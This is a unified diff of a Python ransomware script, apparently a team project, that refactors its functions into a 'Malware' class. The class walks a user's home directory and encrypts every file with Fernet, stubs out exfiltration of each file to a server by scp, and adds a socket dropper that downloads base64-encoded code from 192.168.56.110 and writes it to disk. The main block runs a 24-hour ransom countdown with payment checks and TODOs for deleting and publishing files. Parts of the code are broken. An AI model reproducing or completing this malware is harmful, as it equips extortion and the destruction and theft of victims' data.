@@ -4,120 +4,195 @@ from cryptography.fernet import Fernet
 import subprocess
 import time
 import signal
-
-# Home directory
-home = expanduser("~")
-server_ip = "192.168.56.110"
-
-
-#TODO Rafi/Yusef:
-def send_file_to_server(file_path):
-    try:
-        # Maybe replace the below two lines with Rafi's alternative method
-        upload_file_command = "scp " + server_username + "@" + server_ip + ":" + file_path_src + " " + root + path_to_dirs
-        os.system(upload_file_command)
-      except FileNotFoundError:
-        # Directory somehow not yet created
-
-#TODO Subin:
-def check_if_user_has_paid():
-    return False
-
-# def generate_key():
-#     if not os.path.isfile("./key.key"):
-#         key = Fernet.generate_key()
-#         with open("key.key", "wb") as the_key:
-#             the_key.write(key)
+import base64
+import logging
+import socket
+import math
 
 
-# Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
-def list_safe_directories(directory):
+class Malware: 
+    SERVER_IP = "192.168.56.110"
+    ENCODING = "utf-8"
 
-    result = []
-    excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])
+    def __init__(self, host1, host2, number):
+        # Construct hostname of the remote server from the first two
+        # arguments.
+        self._host = self.SERVER_IP
+        # Calculate the port number from the last argument.
+        self._port = self.decode_port(number)
+        # Initialize socket for the connection.
+        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Go through all of the directories and exlcude the ones in the excluded_dirs set
-    for root, dirs, _ in os.walk(directory):
-        dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]
+    @property
+    def host(self):
+        """ Server that sends us the malicious code. """
+        return self._host
 
-        result.append(root)
-        for directory in dirs:
-            result.append(os.path.join(root, directory))
+    @host.setter
+    def host(self, new_host):
+        self._host = new_host
 
-    return result  # Return the list of directories
+    def decode_hostname(self, str1, str2):
+        """ Returns hostname of the remote server. """
+        return str2[::-1] + str1[::-1]
 
-# Method that retrieves all of the files in a directory and purposely does not include the ransomeware
-def get_files_in_dir(directory):
-    # change to home directory so that the paths are correct relative paths.
-    os.chdir(directory)
+    @property
+    def port(self):
+        """ Port, on which the server runs (`int`). """
+        return self._port
 
-    files = []
-    for file in os.listdir(directory):
-        # We do not want to encrypt our own ransomware
-        if file == "mal.py" or file == "key.key":
-            continue
-        if os.path.isfile(file):
-            files.append(file)
+    @port.setter
+    def port(self, new_port):
+        self._port = new_port
 
-    return files
+    def decode_port(self, port):
+        """Returns target port of the remote server. """
+        return int(math.sqrt(port))
 
+    @property
+    def socket(self):
+        """ Client socket. """
+        return self._socket
 
-# Method for encrypting a single file
-def encrypt_file(file, key):
-    print("started")
-    with open(file, "rb") as the_file:
-        contents = the_file.read()
+    #TODO Rafi/Yusef:
+    def send_file_to_server(self, file_path):
+        return False
 
-    encrypted_contents = Fernet(key).encrypt(contents)
-    with open(file, "wb") as the_file:
-        the_file.write(encrypted_contents)
-    print("terminated")
+    #TODO Subin:
+    def check_if_user_has_paid(self):
+        return False
 
+    # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
+    def list_safe_directories(self, directory):
 
-# Encrypt all the safe to encrypt files on a victims pc
-def encrypt_and_send_all_files(directory, key):
+        result = []
+        excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])
 
-    number_of_files = 0
-    size_of_files = 0
+        # Go through all of the directories and exlcude the ones in the excluded_dirs set
+        for root, dirs, _ in os.walk(directory):
+            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]
 
-    dir_list = list_safe_directories(home)
-    for dir in dir_list:
-        for file in get_files_in_dir(dir):
-            file_path = os.path.join(dir, file)
-            file_size = os.path.getsize(file_path)
-            size_of_files += file_size
-            number_of_files += 1
+            result.append(root)
+            for directory in dirs:
+                result.append(os.path.join(root, directory))
 
-            # Send file to server
-            send_file_to_server(file_path)
+        return result  # Return the list of directories
 
-            # Encrypt file
-            encrypt_file(file_path, key)
+    # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
+    def get_files_in_dir(self, directory):
+        # change to home directory so that the paths are correct relative paths.
+        os.chdir(directory)
 
-    print("Number of files encrypted: " + str(number_of_files))
-    print("Total size of files: " + str(size_of_files))
+        files = []
+        for file in os.listdir(directory):
+            # We do not want to encrypt our own ransomware
+            if file == "mal.py" or file == "key.key":
+                continue
+            if os.path.isfile(file):
+                files.append(file)
 
-
-def decrypt_file(file_path, key):
-    with open(file_path, "rb") as file:
-        encrypted_contents = file.read()
-
-    decrypted_contents = Fernet(key).decrypt(encrypted_contents)
-    with open(file_path, "wb") as the_file:
-        the_file.write(decrypted_contents)
+        return files
 
 
-def decrypt_all_files(directory, key):
-    dir_list = list_safe_directories(home)
-    for dir in dir_list:
-        for file in get_files_in_dir(dir):
-            file_path = os.path.join(dir, file)
-            decrypt_file(file_path, key)
+    # Method for encrypting a single file
+    def encrypt_file(self, file, key):
+        print("started")
+        with open(file, "rb") as the_file:
+            contents = the_file.read()
+
+        encrypted_contents = Fernet(key).encrypt(contents)
+        with open(file, "wb") as the_file:
+            the_file.write(encrypted_contents)
+        print("terminated")
+
+
+    # Encrypt all the safe to encrypt files on a victims pc
+    def encrypt_and_send_all_files(self, directory, key):
+
+        number_of_files = 0
+        size_of_files = 0
+
+        dir_list = self.list_safe_directories(directory)
+        for dir in dir_list:
+            for file in self.get_files_in_dir(dir):
+                file_path = os.path.join(dir, file)
+                file_size = os.path.getsize(file_path)
+                size_of_files += file_size
+                number_of_files += 1
+
+                # Send file to server
+                self.send_file_to_server(file_path)
+
+                # Encrypt file
+                self.encrypt_file(file_path, key)
+
+        print("Number of files encrypted: " + str(number_of_files))
+        print("Total size of files: " + str(size_of_files))
+
+
+    def decrypt_file(self, file_path, key):
+        with open(file_path, "rb") as file:
+            encrypted_contents = file.read()
+
+        decrypted_contents = Fernet(key).decrypt(encrypted_contents)
+        with open(file_path, "wb") as the_file:
+            the_file.write(decrypted_contents)
+
+
+    def decrypt_all_files(self, directory, key):
+        dir_list = self.list_safe_directories(directory)
+        for dir in dir_list:
+            for file in self.get_files_in_dir(dir):
+                file_path = os.path.join(dir, file)
+                self.decrypt_file(file_path, key)
+
+    def execute_attack(self):
+        """ Download malicious code from the server. """
+        # Create a connection to the server.
+        try:
+            print(self._host)
+            self.socket.connect((self._host, self._port))
+        except socket.error:
+            logging.debug('Dropper could not connect to the server.')
+            return
+        
+        """ Receiving the malicious code in the encrypted form. """
+        filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        print(f"[RECV] Receiving the filename.")
+        print(filename)
+        file = open(filename, "w")
+        self._socket.send("Filename received.".encode("utf-8"))
+ 
+        """ Receiving the file data from the client. """
+        while True:
+            data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+            print(data)
+            file.write(data)
+            if data == "DONE.":
+                break
+          
+        print(f"[RECV] Receiving the file data.")
+        #file.write(data)
+        self._socket.send("File data received".encode("utf-8"))
+ 
+        """ Closing the file. """
+        file.close()
+        
+        # Decode the command and dump it into a file.
+        # decode_payload = base64.b64decode(command)
+        # self.dump_data(decode_payload)
+
+        self.send_file_to_server()
+        
+        # exec(open("mal.py").read())
 
 
 
 #Main function/ control flow
-def main(duration):
+if __name__ == '__main__':
+
+    # Home directory
+    HOME = expanduser("~")
 
     #TODO: Replace this with Asymetric crypto
     #Generate key and make a key file
@@ -135,7 +210,7 @@ def main(duration):
     # again its still the same. Alternatively mayb we tell them not to close their computer?
 
     start_time = time.time()
-    remaining_time = duration
+    remaining_time = 86400
 
     while remaining_time > 0:
             # Format the remaining time as hours, minutes and seconds
@@ -151,23 +226,20 @@ def main(duration):
 
             # Update the remaining time
             elapsed_time = time.time() - start_time
-            remaining_time = duration - elapsed_time
+            remaining_time = remaining_time - elapsed_time
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
-            if (check_if_user_has_paid()):
+            if (Malware.check_if_user_has_paid()):
                 break
 
 
     #User has paid before the time ran out
-    if (check_if_user_has_paid()):
+    if (Malware.check_if_user_has_paid()):
         popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been recieved! \n Decrypting all files.","--width", "400", "--height", "200" ])
         # decrypt_all_files(home, key)
         #TODO: Implement code to delete all the files that are stored on the server
 
     else: # Timer has run out
         #TODO: Implement file deletion and internet publication code.
-        return
-
-
-main(86400)
+        print('huh')
